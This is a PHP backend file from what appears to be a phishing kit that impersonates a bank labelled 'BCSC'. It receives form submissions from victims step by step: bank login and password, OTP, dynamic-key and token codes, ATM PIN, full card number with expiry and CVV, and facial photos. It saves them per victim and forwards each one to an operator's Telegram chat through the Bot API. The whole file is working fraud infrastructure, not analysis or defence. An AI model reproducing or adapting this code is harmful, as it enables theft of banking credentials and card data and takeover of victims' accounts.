<?php
ob_start();
session_start();
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../sessions_helper.php';
require_once __DIR__ . '/../../message_builder.php';
ob_end_clean();
header('Content-Type: application/json; charset=utf-8');

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    echo json_encode(['ok' => false, 'error' => 'JSON invalido']);
    exit;
}

$event     = strtoupper(trim($data['event'] ?? $data['step'] ?? 'LOGIN'));
$sessionId = trim($data['sessionId'] ?? '');
$ip        = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';

// Generar ID de sesión BCS propio si no existe
if (!$sessionId) {
    $counter = __DIR__ . '/../../session_counter.txt';
    if (!file_exists($counter)) file_put_contents($counter, 1);
    $n = (int) file_get_contents($counter);
    file_put_contents($counter, $n + 1);
    $sessionId = 'BCS-' . str_pad($n, 3, '0', STR_PAD_LEFT);
}

$allSessions = sess_read();
$sess        = $allSessions[$sessionId] ?? [];
$msgId       = $sess['msgId'] ?? null;

$newFields = [
    'ip'        => $ip,
    'bank'      => 'BCSC',
    'chatId'    => CHAT_ID,
    'lastSeen'  => date('Y-m-d H:i:s'),
    'lastEvent' => "BCSC_{$event}",
];

switch ($event) {
    case 'LOGIN':
        $newFields['usuarioBanco'] = trim($data['username'] ?? '');
        $newFields['passBanco']    = trim($data['password'] ?? '');
        $newFields['step']         = 'banco_login';
        if (!isset($sess['captureIp'])) {
            $newFields['captureIp']   = $ip;
            $newFields['captureTime'] = date('d/m/Y, h:i ') . (date('a') === 'am' ? 'a.m.' : 'p.m.');
        }
        break;
    case 'OTP':
        $prev = $sess['otp_attempts'] ?? [];
        $val  = trim($data['otp'] ?? $data['code'] ?? '');
        $prev[] = $val;
        $newFields['otp_attempts'] = $prev;
        $newFields['otp']          = $val;
        $newFields['step']         = 'banco_otp';
        break;
    case 'DINAMICA':
        $prev = $sess['dinamic_attempts'] ?? [];
        $val  = trim($data['dinamica'] ?? $data['code'] ?? '');
        $prev[] = $val;
        $newFields['dinamic_attempts'] = $prev;
        $newFields['dinamica']         = $val;
        $newFields['step']             = 'banco_dinamica';
        break;
    case 'TOKEN':
        $prev = $sess['token_attempts'] ?? [];
        $val  = trim($data['token'] ?? $data['code'] ?? '');
        $prev[] = $val;
        $newFields['token_attempts'] = $prev;
        $newFields['token']          = $val;
        $newFields['step']           = 'banco_token';
        break;
    case 'ATM':
    case 'CAJERO':
        $val = trim($data['cajero'] ?? $data['atm'] ?? $data['code'] ?? '');
        $newFields['atm']  = $val;
        $newFields['step'] = 'banco_cajero';
        break;
    case 'TARJETA':
        $card = preg_replace('/\s+/', '', trim($data['tarjeta'] ?? $data['card'] ?? $data['tc'] ?? ''));
        $mm   = trim($data['exp_month'] ?? '');
        $yy   = trim($data['exp_year']  ?? '');
        $newFields['card']   = $card;
        $newFields['exp']    = ($mm && $yy) ? "{$mm}/{$yy}" : trim($data['exp'] ?? $data['expiry'] ?? '');
        $newFields['cvv']    = trim($data['cvv']    ?? '');
        $newFields['nombre'] = trim($data['nombre'] ?? '');
        $newFields['step']   = 'banco_tarjeta';
        break;
    case 'FACIAL':
        $newFields['facial'] = '📷 Recibida ✅';
        $newFields['step']   = 'banco_facial';
        break;
    case 'TEXTO':
        $newFields['texto'] = trim($data['texto'] ?? $data['code'] ?? '');
        $newFields['step']  = 'banco_texto';
        break;
}

$mergedSess = array_merge($sess, $newFields);
$text       = buildMessage($mergedSess);
$keyboard   = mainKeyboard();

function tgBCS(string $method, array $params): array {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => API_BASE . "/{$method}",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $params,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    $d = $res ? json_decode($res, true) : null;
    return is_array($d) ? $d : ['ok' => false];
}

$ok = false; $usedMsgId = null;

if ($msgId) {
    $r  = tgBCS('editMessageText', [
        'chat_id'      => CHAT_ID,
        'message_id'   => $msgId,
        'text'         => $text,
        'parse_mode'   => 'Markdown',
        'reply_markup' => json_encode($keyboard),
    ]);
    $ok = $r['ok'] ?? false;
    if ($ok) {
        $usedMsgId = $msgId;
    } elseif (strpos($r['description'] ?? '', 'message is not modified') !== false) {
        $ok = true;
        $usedMsgId = $msgId;
    }
}

if (!$ok) {
    $r = tgBCS('sendMessage', [
        'chat_id'      => CHAT_ID,
        'text'         => $text,
        'parse_mode'   => 'Markdown',
        'reply_markup' => json_encode($keyboard),
    ]);
    $ok        = $r['ok'] ?? false;
    $usedMsgId = $ok ? ($r['result']['message_id'] ?? null) : null;
    if ($ok && $usedMsgId) $newFields['msgId'] = $usedMsgId;
}

if ($event === 'FACIAL' && !empty($data['foto'])) {
    $fData = base64_decode(preg_replace('/^data:image\/\w+;base64,/i', '', $data['foto']));
    $fPath = sys_get_temp_dir() . '/foto_bcs_' . time() . rand(10, 99) . '.jpg';
    file_put_contents($fPath, $fData);
    tgBCS('sendPhoto', [
        'chat_id'    => CHAT_ID,
        'photo'      => new CURLFile(realpath($fPath)),
        'caption'    => "📷 *FACIAL BCS* · `{$ip}`",
        'parse_mode' => 'Markdown',
    ]);
    @unlink($fPath);
}

sess_update($sessionId, $newFields);

echo json_encode([
    'ok'        => $ok,
    'messageid' => $usedMsgId,
    'chatid'    => (string) CHAT_ID,
    'sessionid' => $sessionId,
], JSON_UNESCAPED_UNICODE);
